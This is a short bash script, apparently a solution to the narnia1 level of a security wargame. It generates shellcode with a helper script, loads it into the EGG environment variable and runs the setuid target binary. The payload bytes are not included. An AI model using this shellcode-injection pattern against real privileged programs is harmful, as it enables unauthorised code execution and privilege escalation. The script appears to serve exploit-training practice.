#!/bin/bash
# generate shellcode
./gen.sh
export EGG="$(cat shellcode)"
/narnia/narnia1
